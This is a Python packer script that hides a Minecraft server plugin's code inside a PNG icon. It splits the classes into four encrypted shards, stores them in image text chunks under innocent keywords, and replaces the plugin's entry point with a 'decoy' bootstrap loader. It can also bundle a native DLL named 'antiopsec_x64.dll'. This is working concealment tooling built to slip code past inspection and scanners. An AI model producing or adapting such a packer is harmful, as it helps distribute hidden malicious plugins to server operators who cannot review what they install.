import os
import sys
import struct
import zlib
import io
import zipfile
import hashlib

def calculate_crc32(data: bytes) -> int:
    return zlib.crc32(data) & 0xFFFFFFFF

def derive_cascading_key(prev_key: int, payload_bytes: bytes) -> int:
    """Derives next layer key using SHA-256 cascade (Forward-Security & Anti-Bypass)."""
    h = hashlib.sha256(payload_bytes + struct.pack(">I", prev_key & 0xFFFFFFFF)).digest()
    key = 0
    for b in h[:4]:
        key = ((key << 8) | b) & 0xFFFFFFFF
    return (key ^ 0x5D) & 0xFF

def encrypt_payload(data: bytes, key_seed: int) -> bytes:
    out = bytearray(len(data))
    rk = key_seed & 0xFF
    for i in range(len(data)):
        p = data[i]
        out[i] = ((p + (i & 0x0F)) & 0xFF) ^ rk
        rk = ((rk * 37) ^ p) & 0xFF
    return bytes(out)

def decrypt_payload(data: bytes, key_seed: int) -> bytes:
    out = bytearray(len(data))
    rk = key_seed & 0xFF
    for i in range(len(data)):
        e = data[i] & 0xFF
        val = (e ^ rk) & 0xFF
        p = (val - (i & 0x0F)) & 0xFF
        out[i] = p
        rk = ((rk * 37) ^ p) & 0xFF
    return bytes(out)

def create_ztxt_chunk(keyword: str, payload: bytes) -> bytes:
    compressed_payload = zlib.compress(payload, level=9)
    chunk_data = keyword.encode('latin-1') + b'\x00\x00' + compressed_payload
    chunk_type = b'zTXt'
    length = len(chunk_data)
    crc = calculate_crc32(chunk_type + chunk_data)
    return struct.pack(">I", length) + chunk_type + chunk_data + struct.pack(">I", crc)

def inject_png_chunks(png_bytes: bytes, chunks: list[tuple[str, bytes]]) -> bytes:
    """Injects standard ISO zTXt chunks into PNG image at valid positions."""
    if png_bytes[:8] != b'\x89PNG\r\n\x1a\n':
        raise ValueError("Invalid PNG header")

    out_stream = io.BytesIO()
    out_stream.write(b'\x89PNG\r\n\x1a\n')

    offset = 8
    ihdr_written = False
    idat_written = False

    # Chunks 1 & 2 before IDAT, Chunks 3 & 4 after IDAT
    c1, c2 = chunks[0], chunks[1]
    c3, c4 = chunks[2], chunks[3]

    while offset < len(png_bytes):
        length = struct.unpack(">I", png_bytes[offset:offset+4])[0]
        chunk_type = png_bytes[offset+4:offset+8]
        chunk_full = png_bytes[offset:offset+12+length]
        offset += 12 + length

        out_stream.write(chunk_full)

        if chunk_type == b'IHDR' and not ihdr_written:
            ihdr_written = True
            out_stream.write(create_ztxt_chunk(c1[0], c1[1]))
            out_stream.write(create_ztxt_chunk(c2[0], c2[1]))
        elif chunk_type == b'IDAT' and not idat_written:
            idat_written = True
            out_stream.write(create_ztxt_chunk(c3[0], c3[1]))
            out_stream.write(create_ztxt_chunk(c4[0], c4[1]))

    return out_stream.getvalue()

def extract_png_ztxt(png_bytes: bytes, target_keyword: str) -> bytes:
    if png_bytes[:8] != b'\x89PNG\r\n\x1a\n':
        raise ValueError("Invalid PNG header")

    offset = 8
    while offset < len(png_bytes):
        length = struct.unpack(">I", png_bytes[offset:offset+4])[0]
        chunk_type = png_bytes[offset+4:offset+8]
        chunk_data = png_bytes[offset+8:offset+8+length]
        offset += 12 + length

        if chunk_type == b'zTXt':
            null_idx = chunk_data.find(b'\x00')
            if null_idx != -1:
                kw = chunk_data[:null_idx].decode('latin-1', errors='ignore')
                if kw == target_keyword:
                    compressed_stream = chunk_data[null_idx+2:]
                    return zlib.decompress(compressed_stream)
        elif chunk_type == b'IEND':
            break
    return None

def generate_default_png_icon() -> bytes:
    width, height = 16, 16
    raw_data = bytearray()
    for y in range(height):
        raw_data.append(0)
        for x in range(width):
            if (x in [0, 15] and y in [0, 15]) or (x in [1, 14] and y in [0, 15]):
                raw_data.extend([0, 0, 0, 0])
            else:
                raw_data.extend([217, 119, 6, 255])

    compressed_idat = zlib.compress(bytes(raw_data), level=9)
    png_buf = io.BytesIO()
    png_buf.write(b'\x89PNG\r\n\x1a\n')

    # IHDR
    ihdr_data = struct.pack(">IIBBBBB", width, height, 8, 6, 0, 0, 0)
    png_buf.write(struct.pack(">I", len(ihdr_data)))
    png_buf.write(b'IHDR')
    png_buf.write(ihdr_data)
    png_buf.write(struct.pack(">I", calculate_crc32(b'IHDR' + ihdr_data)))

    # IDAT
    png_buf.write(struct.pack(">I", len(compressed_idat)))
    png_buf.write(b'IDAT')
    png_buf.write(compressed_idat)
    png_buf.write(struct.pack(">I", calculate_crc32(b'IDAT' + compressed_idat)))

    # IEND
    png_buf.write(struct.pack(">I", 0))
    png_buf.write(b'IEND')
    png_buf.write(struct.pack(">I", calculate_crc32(b'IEND')))

    return png_buf.getvalue()

def load_image_as_png(custom_icon_path: str = None) -> bytes:
    if custom_icon_path and os.path.exists(custom_icon_path):
        try:
            from PIL import Image
            im = Image.open(custom_icon_path)
            if im.mode != 'RGBA':
                im = im.convert('RGBA')
            buf = io.BytesIO()
            im.save(buf, format='PNG')
            return buf.getvalue()
        except Exception as e:
            with open(custom_icon_path, 'rb') as cf:
                raw = cf.read()
                if raw[:8] == b'\x89PNG\r\n\x1a\n':
                    return raw
    return generate_default_png_icon()

def pack_jar_with_matryoshka_steganography(input_obf_jar: str, output_final_jar: str, bootstrap_cls_bytes: bytes, custom_icon_path: str = None, native_dll_path: str = None):
    """Packs bytecode into 4 Balanced Matryoshka Shards with Cascading HKDF/HMAC Key Chaining."""
    all_entries = []
    with zipfile.ZipFile(input_obf_jar, 'r') as zin:
        for item in zin.infolist():
            fn = item.filename
            if fn.startswith('META-INF/') or fn in ['plugin.yml', 'bungee.yml', 'velocity-plugin.json']:
                continue
            if not fn.endswith('/'):
                all_entries.append((fn, zin.read(fn)))

    # 1. Distribute all entries into 4 balanced shards (~25% each)
    shards_zip_buffers = [io.BytesIO() for _ in range(4)]
    shards_zips = [zipfile.ZipFile(buf, 'w', compression=zipfile.ZIP_DEFLATED) for buf in shards_zip_buffers]

    for idx, (fn, data) in enumerate(all_entries):
        shard_idx = idx % 4
        shards_zips[shard_idx].writestr(fn, data)

    # Shard 4 also holds Native DLL if provided
    if native_dll_path and os.path.exists(native_dll_path):
        with open(native_dll_path, 'rb') as df:
            shards_zips[3].writestr('assets/native/antiopsec_x64.dll', df.read())

    for z in shards_zips:
        z.close()

    raw_shards = [buf.getvalue() for buf in shards_zip_buffers]

    # 2. Cascading Key Derivation: K1 -> K2 -> K3 -> K4
    K0 = (0xAB ^ 0xF6) # 0x5D
    K1 = (K0 * 31 + 17) & 0xFF
    P1 = raw_shards[0]
    E1 = encrypt_payload(P1, K1)

    K2 = derive_cascading_key(K1, P1)
    P2 = raw_shards[1]
    E2 = encrypt_payload(P2, K2)

    K3 = derive_cascading_key(K2, P2)
    P3 = raw_shards[2]
    E3 = encrypt_payload(P3, K3)

    K4 = derive_cascading_key(K3, P3)
    P4 = raw_shards[3]
    E4 = encrypt_payload(P4, K4)

    # 3. Inject 4 Encrypted Shards into 4 Standard ISO PNG Chunks
    base_png = load_image_as_png(custom_icon_path)
    chunks_to_inject = [
        ("Comment", E1),       # Shard 1 (25% classes)
        ("Author", E2),        # Shard 2 (25% classes)
        ("Description", E3),   # Shard 3 (25% classes)
        ("Software", E4)       # Shard 4 (25% classes + Native DLL)
    ]
    matryoshka_png = inject_png_chunks(base_png, chunks_to_inject)

    # 4. Pack into Final Minimalist Single Root JAR
    with zipfile.ZipFile(input_obf_jar, 'r') as zin, zipfile.ZipFile(output_final_jar, 'w', compression=zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            fn = item.filename
            if fn in ['plugin.yml', 'bungee.yml']:
                p_text = zin.read(fn).decode('utf-8')
                import re
                new_p = re.sub(r'main:\s*.*', 'main: cookie.fack.please.d111.Bootstrap', p_text)
                zout.writestr(item, new_p.encode('utf-8'))
            elif fn.startswith('META-INF/MANIFEST.MF'):
                zout.writestr(item, zin.read(fn))

        # Add Decoy Bootstrap loader and Matryoshka Stego icon.png
        zout.writestr('cookie/fack/please/d111/Bootstrap.class', bootstrap_cls_bytes)
        zout.writestr('icon.png', matryoshka_png)

if __name__ == '__main__':
    if len(sys.argv) >= 4:
        cmd = sys.argv[1]
        if cmd == "pack":
            in_jar = sys.argv[2]
            out_jar = sys.argv[3]
            boot_cls_path = sys.argv[4]
            custom_icon = sys.argv[5] if len(sys.argv) > 5 and sys.argv[5] != "NONE" else None
            native_dll = sys.argv[6] if len(sys.argv) > 6 and sys.argv[6] != "NONE" else None
            with open(boot_cls_path, 'rb') as bf:
                boot_bytes = bf.read()
            pack_jar_with_matryoshka_steganography(in_jar, out_jar, boot_bytes, custom_icon, native_dll)
            print("[v] Successfully packed JAR with Matryoshka 4-Layer Steganography & Cascading Key Chaining.")
